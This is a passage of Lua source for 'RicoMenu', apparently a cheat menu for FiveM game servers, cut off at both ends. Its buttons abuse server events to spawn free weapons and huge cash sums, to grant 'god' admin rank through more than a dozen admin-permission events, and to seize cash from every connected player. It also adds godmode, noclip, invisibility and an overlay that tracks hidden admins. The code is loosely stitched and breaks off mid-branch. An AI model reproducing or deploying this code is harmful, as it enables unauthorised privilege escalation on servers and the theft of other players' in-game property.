            price = 0,
            amount = 2000000000000,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 6,
        },
        [7] = {
            name = "weapon_knuckle",
            price = 0,
            amount = 2000000,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 7,
        },
        [8] = {
            name = "weapon_crowbar",
            price = 0,
            amount = 20000000000,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 8,
        },
        [9] = {
            name = "weapon_machinepistol",
            price = 0,
            amount = 20000000000,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 9,
        },
        [10] = {
            name = "weapon_microsmg",
            price = 0,
            amount = 2000000000,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 10,
        },
        [11] = {
            name = "weapon_specialcarbine",
            price = 0,
            amount = 2000,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 11,
        },
        [12] = {
            name = "weapon_dagger",
            price = 0,
            amount = 200,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 12,
        },
        [13] = {
            name = "weapon_switchblade",
            price = 0,
            amount = 200,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 13,
        },
        [14] = {
            name = "weapon_machete",
            price = 0,
            amount = 200,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 14,
        },
        [15] = {
            name = "weapon_knife",
            price = 0,
            amount = 200,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 15,
        },
        [16] = {
            name = "weapon_hatchet",
            price = 0,
            amount = 200,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 16,
        },
        [17] = {
            name = "radio",
            price = 0,
            amount = 200,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 17,
        },
        [18] = {
            name = "weapon_smokegrenade",
            price = 0,
            amount = 200,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 18,
        },
        [19] = {
            name = "weapon_wrench",
            price = 0,
            amount = 200,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 19,
        },
        [20] = {
            name = "adrenaline",
            price = 0,
            amount = 200000000,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 20,
        },
        [21] = {
            name = "advancedlockpick",
            price = 0,
            amount = 200,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 21,
        },
        [22] = {
            name = "weapon_stickybomb",
            price = 0,
            amount = 200,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 22,
        },
        [23] = {
            name = "weapon_grenade",
            price = 0,
            amount = 200,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 23,
        },
        [24] = {
            name = "heavyarmor",
            price = 0,
            amount = 200000000000000,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 24,
        },
        [25] = {
            name = "weapon_pipebomb",
            price = 0,
            amount = 200,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 25,
        },
        [26] = {
            name = "weapon_molotov",
            price = 0,
            amount = 200,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 26,
        },
        [27] = {
            name = "lockpick",
            price = 0,
            amount = 200,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 27,
        },
        [28] = {
            name = "weapon_poolcue",
            price = 0,
            amount = 200,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 28,
        },
        [29] = {
            name = "pistol_ExtendedClip",
            price = 0,
            amount = 200,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 29,
        },
        [30] = {
            name = "handcuffs",
            price = 0,
            amount = 2000000,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 30,
        },
        [31] = {
            name = "pistol_ammo",
            price = 0,
            amount = 2000000,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 31,
        },
        [32] = {
            name = "rifle_ammo",
            price = 0,
            amount = 2000000,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 32,
        },
        [33] = {
            name = "smg_ammo",
            price = 0,
            amount = 2000000,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 33,
        },
        [34] = {
            name = "pistol_Suppressor",
            price = 0,
            amount = 2000000,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 34,
        },
        [35] = {
            name = "weapon_heavyrifle",
            price = 0,
            amount = 200,
            info = {
               ammo = 5000,
            },
            type = "item",
            slot = 35,
        },
        [36] = {
            name = "weapon_rpg",
            price = 0,
            amount = 200,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 36,
        },
        [37] = {
            name = "weapon_heavysniper_mk2",
            price = 0,
            amount = 200,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 37,
        },
        [38] = {
            name = "weapon_heavysniper",
            price = 0,
            amount = 200,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 38,
        },
        [39] = {
            name = "weapon_ceramicpistol",
            price = 0,
            amount = 2000,
            info = {
               ammo = 50000,
            },
            type = "item",
            slot = 39,
        },
        [40] = {
            name = "weapon_pistolxm3",
            price = 0,
            amount = 2000,
            info = {
               ammo = 50000,
            },
            type = "item",
            slot = 40,
        },
        [41] = {
            name = "weapon_sniperrifle",
            price = 0,
            amount = 200,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 41,
        },
        [42] = {
            name = "weapon_appistol",
            price = 0,
            amount = 20000,
            info = {
               ammo = 5000,
            },
            type = "item",
            slot = 42,
        },
        [43] = {
            name = "weapon_hominglauncher",
            price = 0,
            amount = 200,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 43,
        },
        [44] = {
            name = "weapon_grenadelauncher",
            price = 0,
            amount = 200,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 44,
        },
        [45] = {
            name = "weapon_compactlauncher",
            price = 0,
            amount = 200,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 45,
        },
        [46] = {
            name = "weapon_smg",
            price = 0,
            amount = 200,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 46,
        },
        [47] = {
            name = "weapon_heavyshotgun",
            price = 0,
            amount = 200,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 47,
        },
        [48] = {
            name = "weapon_marksmanpistol",
            price = 0,
            amount = 200,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 48,
        },
        [49] = {
            name = "weapon_pistol_mk2",
            price = 0,
            amount = 2000,
            info = {
               ammo = 5000,
            },
            type = "item",
            slot = 49,
        },
        [50] = {
            name = "weapon_gusenberg",
            price = 0,
            amount = 20000,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 50,
        },
        [51] = {
            name = "weapon_marksmanrifle_mk2",
            price = 0,
            amount = 200,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 51,
        },
        [52] = {
            name = "weapon_revolver_mk2",
            price = 0,
            amount = 200,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 52,
        },
        [53] = {
            name = "weapon_carbinerifle",
            price = 0,
            amount = 20000,
            info = {
               ammo = 50000,
            },
            type = "item",
            slot = 53,
        },
        [54] = {
            name = "weapon_pumpshotgun_mk2",
            price = 0,
            amount = 200,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 54,
        },
        [55] = {
            name = "weapon_marksmanrifle",
            price = 0,
            amount = 200,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 55,
        },
        [56] = {
            name = "weapon_revolver",
            price = 0,
            amount = 200,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 56,
        },
        [57] = {
            name = "weapon_pumpshotgun",
            price = 0,
            amount = 200,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 57,
        },
        [58] = {
            name = "weapon_assaultrifle",
            price = 0,
            amount = 200,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 58,
        },
        [59] = {
            name = "weapon_compactrifle",
            price = 0,
            amount = 200000,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 59,
        },
        [60] = {
            name = "weapon_combatmg_mk2",
            price = 0,
            amount = 200,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 60,
        },
        [61] = {
            name = "medkit",
            price = 0,
            amount = 200000000000000000000,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 60,
        },        
        [62] = {
            name = "blackmoney",
            price = 0,
            amount = 20000000000000000000000000000000000000000000000000000000000000,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 61,
        },
        [63] = {
            name = "cash",
            price = 0,
            amount = 2000000000000000000000000000000000000000000000000000000000000,
            info = {
               ammo = 500,
            },
            type = "item",
            slot = 62,
        },
        
        
    }
}


Config.Locations = {
    ["arcadebar"] = {
        ["blip"] = "arcadebar_shop_blip",
        ["label"] = "arcadebar_shop",
        ["type"] = "arcadebar",
        ["coords"] = {[1] = vector3(339.17, -909.97, 29.25)},
        ["products"] = Config.Products["arcadebar"],
    },
}


local ShopItems = {}
ShopItems.label = Config.Locations["arcadebar"]["label"]
ShopItems.items = Config.Locations["arcadebar"]["products"]
ShopItems.slots = 30

TriggerServerEvent("inventory:server:OpenInventory", "shop", "vending_drink", ShopItems)
            elseif RicoMenu.CheckBox("~b~Semi ~w~Godmode", Demigod) then
                Demigod = not Demigod
            elseif RicoMenu.Button("~y~Detect ~r~Admins ~b~Names + Lines") then
-- Function to draw a line between two points
function DrawLineToInvisiblePlayer(startCoords, endCoords, color)
    DrawLine(startCoords.x, startCoords.y, startCoords.z, endCoords.x, endCoords.y, endCoords.z, color.r, color.g, color.b, color.a)
end

-- Function to draw text on the screen
function DrawTextOnScreen(text, x, y, scale)
    SetTextFont(4)
    SetTextProportional(1)
    SetTextScale(scale, scale)
    SetTextColour(255, 0, 0, 255)
    SetTextEntry("STRING")
    AddTextComponentString(text)
    DrawText(x, y)
end

-- Main thread
Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)

        local playerPed = PlayerPedId()
        local playerCoords = GetEntityCoords(playerPed)
        local radius = 200.0
        local adminCount = 0
        local yOffset = 0.1 -- Initial y position for drawing text

        -- Loop to draw text and lines
        for i = 0, 255 do
            if NetworkIsPlayerActive(i) and i ~= PlayerId() then
                local targetPed = GetPlayerPed(i)
                local targetCoords = GetEntityCoords(targetPed)
                local distance = #(playerCoords - targetCoords)

                if distance <= radius and not IsEntityVisible(targetPed) then
                    local color = { r = 255, g = 0, b = 0, a = 255 }
                    DrawLineToInvisiblePlayer(playerCoords, targetCoords, color)
                    adminCount = adminCount + 1

                    -- Draw admin names
                    local adminName = GetPlayerName(i)
                    DrawTextOnScreen(adminName, 0.5, yOffset, 0.4)
                    yOffset = yOffset + 0.02 -- Adjust vertical spacing
                end
            end
        end

        -- Display the number of admins nearby
        DrawTextOnScreen("Admins nearby: " .. adminCount, 0.5, 0.05, 0.5)
    end
end)                                                                                
			elseif RicoMenu.Button("~y~[ESX] ~w~Give All ~b~License 💳") then
			    TriggerServerEvent('esx_dmvschool:addLicense', 'dmv')
                TriggerServerEvent('esx_dmvschool:addLicense', 'drive')
                TriggerServerEvent('esx_dmvschool:addLicense', 'drive_bike')
                TriggerServerEvent('esx_dmvschool:addLicense', 'drive_truck')
                TriggerServerEvent('esx_dmvschool:addLicense', 'weapon')
			elseif RicoMenu.Button("~y~Pickup~b~Props V2 💪 ~w~KEY ~y~[Y]") then
local holdingEntity = false
local holdingCarEntity = false
local holdingPed = false
local heldEntity = nil
local entityType = nil

Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)
        if holdingEntity and heldEntity then
            local playerPed = PlayerPedId()
            local headPos = GetPedBoneCoords(playerPed, 0x796e, 0.0, 0.0, 0.0)
            DrawText3Ds(headPos.x, headPos.y, headPos.z + 0.5, "[Y] Drop Entity / [U] Attach Ped | RicoMenu")
            if holdingCarEntity and not IsEntityPlayingAnim(playerPed, 'anim@mp_rollarcoaster', 'hands_up_idle_a_player_one', 3) then
                RequestAnimDict('anim@mp_rollarcoaster')
                while not HasAnimDictLoaded('anim@mp_rollarcoaster') do
                    Citizen.Wait(100)
                end
                TaskPlayAnim(playerPed, 'anim@mp_rollarcoaster', 'hands_up_idle_a_player_one', 8.0, -8.0, -1, 50, 0, false, false, false)
            elseif (holdingPed or not holdingCarEntity) and not IsEntityPlayingAnim(playerPed, 'anim@heists@box_carry@', 'idle', 3) then
                RequestAnimDict('anim@heists@box_carry@')
                while not HasAnimDictLoaded('anim@heists@box_carry@') do
                    Citizen.Wait(100)
                end
                TaskPlayAnim(playerPed, 'anim@heists@box_carry@', 'idle', 8.0, -8.0, -1, 50, 0, false, false, false)
            end

            if not IsEntityAttached(heldEntity) then
                holdingEntity = false
                holdingCarEntity = false
                holdingPed = false
                heldEntity = nil
            end
        end
    end
end)

Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)
        local playerPed = PlayerPedId()
        local camPos = GetGameplayCamCoord()
        local camRot = GetGameplayCamRot(2)
        local direction = RotationToDirection(camRot)
        local dest = vec3(camPos.x + direction.x * 10.0, camPos.y + direction.y * 10.0, camPos.z + direction.z * 10.0)

        local rayHandle = StartShapeTestRay(camPos.x, camPos.y, camPos.z, dest.x, dest.y, dest.z, -1, playerPed, 0)
        local _, hit, _, _, entityHit = GetShapeTestResult(rayHandle)
        local validTarget = false

        if hit == 1 then
            entityType = GetEntityType(entityHit)
            if entityType == 3 or entityType == 2 or entityType == 1 then
                validTarget = true
                local entityText = entityType == 3 and "Object" or (entityType == 2 and "Car" or "Ped")
                local entityModel = GetEntityModel(entityHit)
                local accessInfo = ""
                if entityType == 2 then
                    if NetworkHasControlOfEntity(entityHit) then
                        accessInfo = ", Access: Yes"
                    else
                        accessInfo = ", Access: No"
                        NetworkRequestControlOfEntity(entityHit)
                    end
                end
                local entityInfo = "Entity Type: " .. entityText .. ", Entity: " .. entityHit .. ", Model: " .. entityModel .. accessInfo
                local headPos = GetPedBoneCoords(playerPed, 0x796e, 0.0, 0.0, 0.0)
                DrawText3Ds(headPos.x, headPos.y, headPos.z + 0.5, entityInfo)
            end
        end

        if IsControlJustReleased(0, 246) then  -- Y key
            if validTarget then
                if not holdingEntity and entityHit and (entityType == 3 or entityType == 2 or entityType == 1) then
                    if entityType == 3 then
                        local entityModel = GetEntityModel(entityHit)
                        DeleteEntity(entityHit)
                        RequestModel(entityModel)
                        while not HasModelLoaded(entityModel) do
                            Citizen.Wait(100)
                        end

                        local clonedEntity = CreateObject(entityModel, camPos.x, camPos.y, camPos.z, true, true, true)
                        SetModelAsNoLongerNeeded(entityModel)
                        holdingEntity = true
                        heldEntity = clonedEntity
                        RequestAnimDict("anim@heists@box_carry@")
                        while not HasAnimDictLoaded("anim@heists@box_carry@") do
                            Citizen.Wait(100)
                        end
                        TaskPlayAnim(playerPed, "anim@heists@box_carry@", "idle", 8.0, -8.0, -1, 50, 0, false, false, false)
                        AttachEntityToEntity(clonedEntity, playerPed, GetPedBoneIndex(playerPed, 60309), 0.0, 0.2, 0.0, 0.0, 0.0, 0.0, true, true, false, true, 1, true)
                    elseif entityType == 2 then
                        holdingEntity = true
                        holdingCarEntity = true
                        heldEntity = entityHit
                        RequestAnimDict('anim@mp_rollarcoaster')
                        while not HasAnimDictLoaded('anim@mp_rollarcoaster') do
                            Citizen.Wait(100)
                        end
                        TaskPlayAnim(playerPed, 'anim@mp_rollarcoaster', 'hands_up_idle_a_player_one', 8.0, -8.0, -1, 50, 0, false, false, false)
                        AttachEntityToEntity(heldEntity, playerPed, GetPedBoneIndex(playerPed, 60309), 1.0, 0.5, 0.0, 0.0, 0.0, 0.0, true, true, false, false, 1, true)
                    elseif entityType == 1 then
                        holdingEntity = true
                        holdingPed = true
                        heldEntity = entityHit
                        RequestAnimDict('anim@heists@box_carry@')
                        while not HasAnimDictLoaded('anim@heists@box_carry@') do
                            Citizen.Wait(100)
                        end
                        TaskPlayAnim(playerPed, 'anim@heists@box_carry@', 'idle', 8.0, -8.0, -1, 50, 0, false, false, false)
                        
                        -- Move the ped closer to the player
                        local playerCoords = GetEntityCoords(playerPed)
                        local pedCoords = GetEntityCoords(heldEntity)
                        local newPedCoords = vector3(playerCoords.x, playerCoords.y, playerCoords.z - 1) -- Adjust this value to your preference
                        SetEntityCoords(heldEntity, newPedCoords.x, newPedCoords.y, newPedCoords.z, false, false, false, false)

                        -- Clear the ped's tasks
                        ClearPedTasksImmediately(heldEntity)

                        -- Attach the ped to the player
                        AttachEntityToEntity(heldEntity, playerPed, GetPedBoneIndex(playerPed, 60309), 1.0, 0.5, 0.0, 0.0, 0.0, 0.0, true, true, false, false, 1, true)
                    end
                end
            else
                if holdingEntity and (holdingCarEntity or holdingPed) then
                    holdingEntity = false
                    holdingCarEntity = false
                    holdingPed = false
                    ClearPedTasks(playerPed)
                    DetachEntity(heldEntity, true, true)
                    ApplyForceToEntity(heldEntity, 1, direction.x * 40, direction.y * 40, direction.z * 40, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                elseif holdingEntity then
                    holdingEntity = false
                    ClearPedTasks(playerPed)
                    DetachEntity(heldEntity, true, true)
                    local playerCoords = GetEntityCoords(playerPed)
                    SetEntityCoords(heldEntity, playerCoords.x, playerCoords.y, playerCoords.z - 1, false, false, false, false)
                    SetEntityHeading(heldEntity, GetEntityHeading(playerPed))
                end
            end
        end

        -- Additional key press to attach the ped to an object
        if IsControlJustReleased(0, 303) then  -- U key
            if holdingPed and validTarget then
                DetachEntity(heldEntity, true, true) -- Detach the ped from the player
                AttachEntityToEntity(heldEntity, entityHit, 0, 0.0, 0.0, 1.5, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                FreezeEntityPosition(heldEntity, true) -- Freeze the ped's position
                TaskStartScenarioInPlace(heldEntity, "WORLD_HUMAN_PARTYING", 0, true) -- Make the ped dance
                holdingPed = false  -- Reset holdingPed flag
                heldEntity = nil    -- Clear heldEntity
            end
        end
    end
end)

function RotationToDirection(rotation)
    local adjustedRotation = vec3((math.pi / 180) * rotation.x, (math.pi / 180) * rotation.y, (math.pi / 180) * rotation.z)
    local direction = vec3(-math.sin(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)), math.cos(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)), math.sin(adjustedRotation.x))
    return direction
end

function DrawText3Ds(x, y, z, text)
    local onScreen, _x, _y = World3dToScreen2d(x, y, z)
    local px, py, pz = table.unpack(GetGameplayCamCoords())
    local scale = (1 / GetDistanceBetweenCoords(px, py, pz, x, y, z, 1)) * 2
    local fov = (1 / GetGameplayCamFov()) * 100
    scale = scale * fov

    if onScreen then
        SetTextScale(0.0 * scale, 0.35 * scale)
        SetTextFont(0)
        SetTextProportional(1)
        SetTextColour(255, 255, 255, 215)
        SetTextDropshadow(0, 0, 0, 0, 155)
        SetTextEdge(2, 0, 0, 0, 150)
        SetTextDropShadow()
        SetTextOutline()
        SetTextEntry("STRING")
        SetTextCentre(1)
        AddTextComponentString(text)
        DrawText(_x, _y)
    end
end
                elseif RicoMenu.Button("~y~[QB] ~s~Give ~b~Pistol ~y~[INVENTORY] 📦") then
                TriggerServerEvent('QBCore:Server:AddItem',"weapon_heavypistol",1)
                TriggerServerEvent('QBCore:Server:AddItem',"pistol_ammo",100)
                TriggerServerEvent('QBCore:Server:AddItem',"handcuffs",1)
                TriggerServerEvent('QBCore:Server:AddItem',"pistol_Suppressor",1)
                TriggerServerEvent('QBCore:Server:AddItem',"pistol_ExtendedClip",1)
                elseif RicoMenu.Button("~w~Give ~b~Knuckle 👊🏾  ~y~[SUPPORT OX INVENTORY]") then
                weapon = GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_KNUCKLE"), 1000, false, true)
                elseif RicoMenu.Button("~w~Give ~b~AP Pistol 👻 ~y~(GHOST WEAPON)") then
                weapon = GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("weapon_appistol"), 1000, false, true)
                			elseif RicoMenu.Button("~y~[QB] ~s~Steal Everyones ~y~Money 💰") then
                               for i = 255, 1, -1 do
                            TriggerServerEvent("police:server:SeizeCash", i)
                            end
            elseif RicoMenu.Button("~y~[QB-Admin] ~s~Admin Access 🔐 ~r~(RISK)") then
            local group = {rank = "god", label = "God"}

                local target = GetPlayerServerId(PlayerId())



                TriggerServerEvent('iz-admin:server:setPermissions', target, group)

                TriggerServerEvent('rl-admin:server:setPermissions', target, group)

                TriggerServerEvent('qb-admin:server:setPermissions', target, group)

                TriggerServerEvent('somis-admin:server:setPermissions', target, group)

                TriggerServerEvent('pr-admin:server:setPermissions', target, group)

                TriggerServerEvent('ts-admin:server:setPermissions', target, group)

                TriggerServerEvent('vs-admin:server:setPermissions', target, group)

                TriggerServerEvent('uy-admin:server:setPermissions', target, group)

                TriggerServerEvent('nn-admin:server:setPermissions', target, group)

                TriggerServerEvent('nc-admin:server:setPermissions', target, group)

                TriggerServerEvent('qb-admin2:server:setPermissions', target, group)

                TriggerServerEvent('ts-admin:server:setPermissions', target, group)

		        TriggerServerEvent('brs-admin:server:setPermissions', target, group)

                TriggerServerEvent('ch-admin:server:setPermissions', target, group)
			elseif RicoMenu.Button("~y~Self ~r~Revive 💊") then
				local confirm = GetKeyboardInput("Using this option will ~r~risk banned ~s~server! Are you Sure? ~g~Y~w~/~r~N")
			 if string.lower(confirm) == "y" then
			 	TriggerEvent("esx_status:set", "hunger", 1000000)
				TriggerEvent("esx_status:set", "thirst", 1000000)
                TriggerServerEvent("QBCore:Server:SetMetaData", "hunger", 100)
                TriggerServerEvent("QBCore:Server:SetMetaData", "thirst", 100)
				TriggerEvent("esx_ambulancejob:revive")
				TriggerEvent('ambulancier:selfRespawn')
                TriggerEvent("hospital:client:Revive")
			 else
					ShowInfo("~r~Operation Canceled")
				end
		    elseif RicoMenu.ComboBox("~b~Player ~s~Functions ~y~»", {"~b~QB ~s~Revive", "~b~Give ~s~Player Armor", "~y~Remove ~s~Player Armor", "~g~Clean Player", "~y~Suicide 💀", "~y~Cancel Anim/Task"}, currPFuncIndex, selPFuncIndex, function(currentIndex, selClothingIndex)
                currPFuncIndex = currentIndex
                selPFuncIndex = currentIndex
                end) then
				if selPFuncIndex == 1 then
					SetEntityHealth(PlayerPedId(), 200)
				elseif selPFuncIndex == 2 then
					SetPedArmour(PlayerPedId(), 100)
				elseif selPFuncIndex == 3 then
					SetPedArmour(PlayerPedId(), 0)
				elseif selPFuncIndex == 4 then
					ClearPedBloodDamage(PlayerPedId())
					ClearPedWetness(PlayerPedId())
					ClearPedEnvDirt(PlayerPedId())
					ResetPedVisibleDamage(PlayerPedId())
				elseif selPFuncIndex == 5 then
					SetEntityHealth(PlayerPedId(), 0)
				elseif selPFuncIndex == 6 then
					ClearPedTasksImmediately(PlayerPedId())
				end
			elseif RicoMenu.CheckBox("Infinite Stamina", InfStamina) then
				InfStamina = not InfStamina
            elseif RicoMenu.CheckBox("Alternative Demigod Mode", ADemigod) then
                ADemigod = not ADemigod
            elseif RicoMenu.CheckBox("Infinite Stamina", InfStamina) then
                InfStamina = not InfStamina
            elseif RicoMenu.ComboBoxSlider("Fast Run", FastCBWords, currFastRunIndex, selFastRunIndex, function(currentIndex, selClothingIndex)
                currFastRunIndex = currentIndex
                selFastRunIndex = currentIndex
                FastRunMultiplier = FastCB[currentIndex]
                SetRunSprintMultiplierForPlayer(PlayerId(), FastRunMultiplier)
                end) then
			elseif RicoMenu.ComboBoxSlider("Fast Swim", FastCBWords, currFastSwimIndex, selFastSwimIndex, function(currentIndex, selClothingIndex)
                currFastSwimIndex = currentIndex
                selFastSwimIndex = currentIndex
                FastSwimMultiplier = FastCB[currentIndex]
                SetSwimMultiplierForPlayer(PlayerId(), FastSwimMultiplier)
                end) then
            elseif RicoMenu.CheckBox("Super Jump", SuperJump) then
                SuperJump = not SuperJump
            elseif RicoMenu.CheckBox("Invisibility", Invisibility) then
                Invisibility = not Invisibility
                if not Invisibility then
                    SetEntityVisible(PlayerPedId(), true)
                end
            elseif RicoMenu.CheckBox("~m~Magneto Mode ~s~KEY ~y~[E]", ForceTog) then
                ForceMod()
            elseif RicoMenu.CheckBox("~m~Forcefield", Forcefield) then
                Forcefield = not Forcefield
			elseif RicoMenu.ComboBox("~c~Forcefield Radius ~y~»", ForcefieldRadiusOps, currForcefieldRadiusIndex, selForcefieldRadiusIndex, function(currentIndex, selectedIndex)
                    currForcefieldRadiusIndex = currentIndex
                    selForcefieldRadiusIndex = currentIndex
                    ForcefieldRadius = ForcefieldRadiusOps[currentIndex]
                    end) then
            elseif RicoMenu.CheckBox("~m~Noclip", Noclipping) then
                ToggleNoclip()
			elseif RicoMenu.ComboBox("~c~Noclip Speed ~y~»", NoclipSpeedOps, currNoclipSpeedIndex, selNoclipSpeedIndex, function(currentIndex, selectedIndex)
                    currNoclipSpeedIndex = currentIndex
                    selNoclipSpeedIndex = currentIndex
                    NoclipSpeed = NoclipSpeedOps[currNoclipSpeedIndex]
                    end) then
            end
        
        
        -- APPEARANCE MENU
        elseif RicoMenu.IsMenuOpened('appearance') then
		if RicoMenu.MenuButton("Models", 'skinsmodels') then
            elseif RicoMenu.Button("Set Model Name") then
                local model = GetKeyboardInput("Enter Model Name:")
                RequestModel(GetHashKey(model))
                Wait(500)
                if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                else ShowInfo("~r~Model not recognized (Try Again)") end
            elseif RicoMenu.MenuButton("Modify Skin Textures", 'modifyskintextures') then
            elseif RicoMenu.ComboBox("Save Outfit", ClothingSlots, currClothingIndex, selClothingIndex, function(currentIndex, selectedIndex)
                currClothingIndex = currentIndex
                selClothingIndex = currentIndex
            end) then
                Outfits[selClothingIndex] = GetCurrentOutfit(PlayerId())
            elseif RicoMenu.ComboBox("Load Outfit", ClothingSlots, currClothingIndex, selClothingIndex, function(currentIndex, selectedIndex)
                currClothingIndex = currentIndex
                selClothingIndex = currentIndex
            end) then
                SetCurrentOutfit(Outfits[selClothingIndex])
            end

           
            elseif RicoMenu.IsMenuOpened('modifyskintextures') then
               
				
			

                if RicoMenu.MenuButton("Head", "modifyhead") then
				
					if GetEntityModel(PlayerPedId()) ~= GetHashKey("mp_m_freemode_01") then
						RicoMenu.CloseMenu()
						RicoMenu.OpenMenu('modifyskintextures') 
						ShowInfo("~r~Only MP Models Supported For Now!") 
                    end
                    
					faceItemsList = GetHeadItems()
                    faceTexturesList = GetHeadTextures(GetPedDrawableVariation(PlayerPedId(), 0))
                    hairItemsList = GetHairItems()
                    hairTexturesList = GetHairTextures(GetPedDrawableVariation(PlayerPedId(), 2))
					maskItemsList = GetMaskItems()
					hatItemsList = GetHatItems()
                    hatTexturesList = GetHatTextures(GetPedPropIndex(PlayerPedId(), 0))
				end
				
				elseif RicoMenu.IsMenuOpened('skinsmodels') then
		
if RicoMenu.Button("~g~Reset Model To FiveM Player") then
				AntiMenuCrash = 0
				RequestModel("mp_m_freemode_01")

				Wait(450)
				
				while not HasModelLoaded(GetHashKey("mp_m_freemode_01")) and AntiMenuCrash < 5000 do
					AntiMenuCrash = AntiMenuCrash + 1
					Wait(0)
				end

				if HasModelLoaded(GetHashKey("mp_m_freemode_01")) then
					SetPlayerModel(PlayerId(), "mp_m_freemode_01")
					SetPedPropIndex(PlayerPedId(), 0, 56, 1, 0)
					SetPedPropIndex(PlayerPedId(), 1, 7, 2, 0)
					SetPedComponentVariation(PlayerPedId(), 1, 51, 7, 0)
					SetPedComponentVariation(PlayerPedId(), 2, 11, 4, 0)
					SetPedComponentVariation(PlayerPedId(), 3, 14, 0, 0)
					SetPedComponentVariation(PlayerPedId(), 4, 4, 0, 0)
					SetPedComponentVariation(PlayerPedId(), 6, 6, 0, 0)
					SetPedComponentVariation(PlayerPedId(), 8, 15, 0, 0)
					SetPedComponentVariation(PlayerPedId(), 11, 14, 7, 0)
				end

	elseif RicoMenu.Button("Change To ~p~Clown 🤡") then
			local model = "s_m_y_clown_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
	elseif RicoMenu.Button("Change To ~b~Dog 🐶") then
			local model = "a_c_retriever"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
	elseif RicoMenu.Button("Change To ~r~tiger 🐯") then
			local model = "a_c_mtlion"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
	elseif RicoMenu.Button("Change To ~y~Fat Bitch 👩🏻") then
			local model = "a_f_m_fatcult_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
	elseif RicoMenu.Button("Change To ~o~Old Golf Guy 👴") then
			local model = "a_m_m_golfer_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
	elseif RicoMenu.Button("Change To ~r~Homeless 🧎‍") then
			local model = "a_m_m_tramp_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
	elseif RicoMenu.Button("Change To ~r~Repulsive junkie 🤢") then
			local model = "a_m_o_beach_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
	elseif RicoMenu.Button("Change To ~g~Zombie 🧟") then
			local model = "u_m_y_zombie_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
	elseif RicoMenu.Button("Change To ~r~Robot 🤖") then
			local model = "u_m_y_juggernaut_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
